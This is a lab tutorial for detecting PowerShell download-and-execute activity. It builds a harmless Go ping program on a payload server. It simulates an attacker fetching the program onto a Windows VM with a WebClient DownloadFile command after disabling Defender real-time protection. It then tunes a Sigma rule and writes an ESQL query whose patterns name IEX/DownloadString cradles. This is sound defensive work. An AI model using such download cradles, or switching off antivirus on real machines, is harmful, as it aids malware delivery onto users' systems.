# Suspicious PowerShell Download and Execute Pattern

This example is based on the logic implemented in the [Sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml) that already exists in the ELK if you followed the Docker deployment instructions. If not, you can convert it and upload it as an object to Elasticsearch.

In this section, we will build a simple executable program using Golang that will run ping in the background and is not malicious.

First, you need to set up a payload server, or you can host an HTTP server on a Kali Linux VM. 

Run the VM:

```bash
vagrant up payload-server-1
```

Access the VM by name using `vagrant ssh` or via the management IP shown in the [topology](/resources/images/vagrant-lab-virtual-topology.svg).

Configure networking

```bash
cat <<EOF | sudo tee /etc/network/interfaces > /dev/null
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
  address 192.168.225.4
  netmask 255.255.255.0
  pre-up sleep 2

auto eth1
iface eth1 inet static
  address 100.65.0.6
  netmask 255.255.255.0
  gateway 100.65.0.1
  dns-nameservers 8.8.8.8
  pre-up sleep 2
EOF
```

Restart networking service

```bash
sudo systemctl restart networking
```

Create new directory for HTTP server

```bash
sudo mkdir /root/http-server
```

Create systemd service file for simple HTTP server 

```bash
cat <<'EOF' | sudo tee /etc/systemd/system/simple-http-server.service > /dev/null
[Unit]
Description=Simple HTTP Server
After=network.target

[Service]
ExecStart=/usr/bin/env python3 -m http.server 80 --directory /root/http-server
Restart=always

[Install]
WantedBy=multi-user.target
EOF
```

Set permissions

```bash
sudo chown root:root /etc/systemd/system/simple-http-server.service
```

```bash
sudo chmod 0644 /etc/systemd/system/simple-http-server.service
```

Reload systemd to recognize new service

```bash
sudo systemctl daemon-reload
```

Enable and start the service

```bash
sudo systemctl enable --now simple-http-server.service
```

Install Golang

- Get the latest version of Go

```bash
get_latest_version() {
  curl -s https://go.dev/VERSION?m=text | grep -oE 'go[0-9]+\.[0-9]+(\.[0-9]+)?'
}
```

- Set variables

```bash
GO_VERSION=$(get_latest_version)
GO_URL="https://golang.org/dl/${GO_VERSION}.linux-amd64.tar.gz"
INSTALL_DIR="/usr/local"
```

- Download the latest version

```bash
curl -LO "$GO_URL"
```

- Remove any previous installations

```bash
sudo rm -rf ${INSTALL_DIR}/go
```

- Extract the downloaded archive

```bash
sudo tar -C $INSTALL_DIR -xzf "${GO_VERSION}.linux-amd64.tar.gz"
```

- Clean up the downloaded tar file

```bash
rm "${GO_VERSION}.linux-amd64.tar.gz"
```

- Set up Go environment variables

```bash
echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.profile
echo "export GOPATH=\$HOME/go" >> ~/.profile
echo "export PATH=\$PATH:\$GOPATH/bin" >> ~/.profile
```

- Reload profile to apply changes

```bash
source ~/.profile
```

- Verify installation

```bash
go version
```

Create `main.go` file

```bash
cat <<EOF | tee main.go > /dev/null
//go:build windows

package main

import (
	"context"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"github.com/lxn/win"
)

const (
	idBtnOK = 1001
)

var (
	className = syscall.StringToUTF16Ptr("WinPingDemoWndClass")
	title     = syscall.StringToUTF16Ptr("Lab test")
	labelText = syscall.StringToUTF16Ptr("This demo app is pinging 1.1.1.1 in the background.")
	btnText   = syscall.StringToUTF16Ptr("OK")

	bgCmd       *exec.Cmd
	cancelPing  context.CancelFunc
)

func startPing() {
	// Use a cancellable context. Keep a max timeout if you like.
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	cancelPing = cancel

	cmd := exec.CommandContext(ctx, "ping", "-n", "1000", "1.1.1.1")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err == nil {
		bgCmd = cmd
		// Reap the process without blocking the UI thread.
		go func() { _ = cmd.Wait() }()
	}
}

func stopPingNonBlocking() {
	if cancelPing != nil {
		cancelPing() // CommandContext will kill the process on cancel.
	}
	// Optional: if you didn't start the goroutine above, you'd do:
	// go func() { if bgCmd != nil { _ = bgCmd.Wait() } }()
}

func wndProc(hwnd win.HWND, msg uint32, wparam, lparam uintptr) uintptr {
	switch msg {
	case win.WM_COMMAND:
		switch win.LOWORD(uint32(wparam)) {
		case idBtnOK:
			stopPingNonBlocking()
			win.DestroyWindow(hwnd)
			return 0
		}
	case win.WM_CLOSE: // user clicked the X
		stopPingNonBlocking()
		win.DestroyWindow(hwnd)
		return 0
	case win.WM_DESTROY:
		win.PostQuitMessage(0)
		return 0
	}
	return win.DefWindowProc(hwnd, msg, wparam, lparam)
}

func main() {
	var wc win.WNDCLASSEX
	wc.CbSize = uint32(unsafe.Sizeof(wc))
	wc.LpszClassName = className
	wc.LpfnWndProc = syscall.NewCallback(wndProc)
	wc.HInstance = win.GetModuleHandle(nil)
	wc.HCursor = win.LoadCursor(0, (*uint16)(unsafe.Pointer(uintptr(win.IDC_ARROW))))
	wc.HbrBackground = win.HBRUSH(win.COLOR_WINDOW + 1)

	if win.RegisterClassEx(&wc) == 0 {
		return
	}

	hwnd := win.CreateWindowEx(
		0,
		className,
		title,
		win.WS_OVERLAPPED|win.WS_CAPTION|win.WS_SYSMENU|win.WS_MINIMIZEBOX,
		win.CW_USEDEFAULT, win.CW_USEDEFAULT, 380, 180,
		0, 0, wc.HInstance, nil,
	)
	if hwnd == 0 {
		return
	}

	_ = win.CreateWindowEx(
		0,
		syscall.StringToUTF16Ptr("STATIC"),
		labelText,
		win.WS_CHILD|win.WS_VISIBLE,
		12, 16, 340, 40,
		hwnd, 0, wc.HInstance, nil,
	)

	_ = win.CreateWindowEx(
		0,
		syscall.StringToUTF16Ptr("BUTTON"),
		btnText,
		win.WS_CHILD|win.WS_VISIBLE|win.BS_DEFPUSHBUTTON,
		260, 80, 90, 28,
		hwnd, win.HMENU(idBtnOK), wc.HInstance, nil,
	)

	startPing()

	win.ShowWindow(hwnd, win.SW_SHOWNORMAL)
	win.UpdateWindow(hwnd)

	var msg win.MSG
	for win.GetMessage(&msg, 0, 0, 0) > 0 {
		win.TranslateMessage(&msg)
		win.DispatchMessage(&msg)
	}
}
EOF
```

Initialize module

```bash
go mod init winpingdemo
```

Install dependency

```bash
go get github.com/lxn/win@latest
```

Clean dependencies

```bash
go mod tidy
```

Build 64-bit Windows GUI app

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-H=windowsgui" -o WinPingDemo.exe
```

Move compiled program to the HTTP server directory

```bash
sudo mv ./WinPingDemo.exe /root/http-server
```

Now on the lab Windows VM the HTTP will be available. But I want to show another scenario. 

<div align="center">
    <img alt="HTTP server demo program" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/payload-server-http-winpingdemo.png" width="100%">
</div>

Let's go back to the end of the [Remote connection followed by suspicious process execution](/resources/attack-detect-scenarios/initial-access/remote-admin-tools-windows/remote-connection-followed-by-suspicious-process-execution/Remote-connection-followed-by-suspicious-process-execution.md) scenario and assume that the threat actor will only download this program from the payload server.

> [!IMPORTANT]  
> Disable lab Windows VM Real Time Protection on Defender

> [!IMPORTANT]  
> Enable the `Suspicious PowerShell Download and Execute Pattern` rule on the lab ELK instance or upload a new one.

```powershell
powershell -NoProfile -command "(New-Object System.Net.WebClient).DownloadFile('http://100.65.0.6/WinPingDemo.exe', \"$env:TEMP\\WinPingDemo.exe\")"
```

<div align="center">
    <img alt="Command execution to trigger rule" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/access-to-host.png" width="100%">
</div>

<div align="center">
    <img alt="Command execution to trigger rule" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/download-demo-exe.png" width="100%">
</div>

This rule will generate a lot of alerts. 

<div align="center">
    <img alt="Elastic rule" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/security-alert.png" width="100%">
</div>

Here I applied the Sigma rule and wanted to show that it can be very noisy, so you need to work with it to exclude something or make it more specific. For example, if you filter for only `event.code: 4103`, it will show your PowerShell commands, but to make them unique you need to apply an additional filter with `AND` logic - `powershell.command.type: "Script"`.

<div align="center">
    <img alt="Elastic rule" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/elastic-rule-filter.png" width="100%">
</div>

When the attacker executes this command, it will be saved in the `AppData\Local\Temp` directory.

<div align="center">
    <img alt="" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/saved-file.png" width="100%">
</div>

From Velociraptor's perspective, you will also see this file, which we will explore later in this section.

<div align="center">
    <img alt="Velociraptor" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/velociraptor.png" width="100%">
</div>

So, for example, in this scenario the attacker only downloads and executes it and does not delete it (because that would only complicate the scenario — Velociraptor would be required to extract deleted files, which is possible but out of scope for this demo). We are also interested in what this file is, and we want to extract it to analyze using a sandbox. The problem is that the rule does not extract the exact file name; it only detects PowerShell scripts:

```
"CommandInvocation(Out-Default): ""Out-Default""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.6584
        Host ID = e8bc2ace-7bf7-403b-91dd-9274eb17cd5b
        Host Application = powershell -NoProfile -command (New-Object System.Net.WebClient).DownloadFile('http://100.65.0.6/WinPingDemo.exe', ""$env:TEMP\\WinPingDemo.exe"")
        Engine Version = 5.1.26100.6584
        Runspace ID = d2d80778-4c54-4961-ab3c-e592b592fc86
        Pipeline ID = 1
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 18
        User = WIN-USER-1\testuser
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:"
```

In the example with a full path download using PowerShell, it would be easy to extract the path to the file, but in this case, we have variable ($env). So we need to search for data from the endpoint integration or Sysmon. 

<div align="center">
    <img alt="Endpoint Sysmon file creation" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/endpoint-sysmon-logs-file-creation.png" width="100%">
</div>

It is possible to use a basic Sigma rule that will create an alert if it detects downloading something via PowerShell, and in further logic you can implement custom scripts or an n8n workflow with an Elasticsearch DSL query to find `file.path`. However, I want to use ESQL to do it in a single rule.

```
FROM logs-*
| WHERE
    (
      (
        process.command_line.text RLIKE ".*IEX.*\\(New-Object\\s+Net\\.WebClient\\)\\.DownloadString.*" OR
        process.command_line.text RLIKE ".*iex.*\\(New-Object\\s+Net\\.WebClient\\)\\.DownloadString.*" OR
        process.command_line.text RLIKE ".*Iex.*\\(New-Object\\s+Net\\.WebClient\\)\\.DownloadString.*" OR
        process.command_line.text RLIKE ".*\\-command\\s*\\(New-Object\\s+System\\.Net\\.WebClient\\)\\.DownloadFile\\(.*" OR
        process.command_line.text RLIKE ".*\\-Command\\s*\\(New-Object\\s+System\\.Net\\.WebClient\\)\\.DownloadFile\\(.*" OR
        process.command_line.text RLIKE ".*\\-COMMAND\\s*\\(New-Object\\s+System\\.Net\\.WebClient\\)\\.DownloadFile\\(.*" OR
        process.command_line.text RLIKE ".*\\-c\\s*\\(New-Object\\s+System\\.Net\\.WebClient\\)\\.DownloadFile\\(.*" OR
        process.command_line.text RLIKE ".*\\-C\\s*\\(New-Object\\s+System\\.Net\\.WebClient\\)\\.DownloadFile\\(.*"
      )
      AND event.code == "4103"
      AND powershell.command.type == "Script"
    )
  OR (
      event.category == "file" AND event.module == "endpoint" AND event.action == "creation"
    )
| EVAL ts_sec = DATE_TRUNC(1 second, @timestamp)

/* ---- extract stems per extension ---- */
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_exe}\\.exe%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_dll}\\.dll%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_ps1}\\.ps1%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_bat}\\.bat%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_vbs}\\.vbs%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_js}\\.js%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_jse}\\.jse%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_cmd}\\.cmd%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_msi}\\.msi%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_scr}\\.scr%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_cpl}\\.cpl%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_hta}\\.hta%{GREEDYDATA}"
| GROK process.command_line "%{GREEDYDATA}\\\\%{DATA:file_stem_lnk}\\.lnk%{GREEDYDATA}"

/* ---- build candidates (NULL if stem didn't match) ---- */
| EVAL f_exe = CONCAT(file_stem_exe, ".exe")
| EVAL f_dll = CONCAT(file_stem_dll, ".dll")
| EVAL f_ps1 = CONCAT(file_stem_ps1, ".ps1")
| EVAL f_bat = CONCAT(file_stem_bat, ".bat")
| EVAL f_vbs = CONCAT(file_stem_vbs, ".vbs")
| EVAL f_js  = CONCAT(file_stem_js,  ".js")
| EVAL f_jse = CONCAT(file_stem_jse, ".jse")
| EVAL f_cmd = CONCAT(file_stem_cmd, ".cmd")
| EVAL f_msi = CONCAT(file_stem_msi, ".msi")
| EVAL f_scr = CONCAT(file_stem_scr, ".scr")
| EVAL f_cpl = CONCAT(file_stem_cpl, ".cpl")
| EVAL f_hta = CONCAT(file_stem_hta, ".hta")
| EVAL f_lnk = CONCAT(file_stem_lnk, ".lnk")

/* ---- single normalization (all keyword args) ---- */
| EVAL file_name_norm = COALESCE(`file.name`, f_exe, f_dll, f_ps1, f_bat, f_vbs, f_js, f_jse, f_cmd, f_msi, f_scr, f_cpl, f_hta, f_lnk)

/* --- include host.name in grouping --- */
| WHERE file_name_norm IS NOT NULL AND user.name IS NOT NULL
| STATS
    proc_count = COUNT(process.command_line),
    file_count = COUNT(file.path),
    ts_any     = MAX(@timestamp),
    cmd_any    = MAX(process.command_line),
    path_any   = MAX(file.path),
    act_any    = MAX(event.action)
  BY ts_sec, user.name, host.name, file_name_norm
| WHERE proc_count > 0 AND file_count > 0
| RENAME
    ts_any           AS out.timestamp,
    cmd_any          AS out.process.command.line,
    path_any         AS out.file.path,
    act_any          AS out.event.action,
    file_name_norm   AS out.file.name
| KEEP out.timestamp, out.process.command.line, out.file.name, out.file.path, out.event.action, user.name, host.name
| SORT out.timestamp DESC
```

<div align="center">
    <img alt="ESQL query test" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/esql-query-test.png" width="100%">
</div>

Based on the updated query using ESQL, a new rule will be created with the name [ESQL - Suspicious PowerShell Download and Execute Pattern](/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/rules/Suspicious-PowerShell-Download-and-Execute-Pattern.ndjson)

<div align="center">
    <img alt="ESQL test alert" src="/resources/attack-detect-scenarios/execution/suspicious-powershell-download-and-execute-pattern/images/esql-test-alert.png" width="100%">
</div>
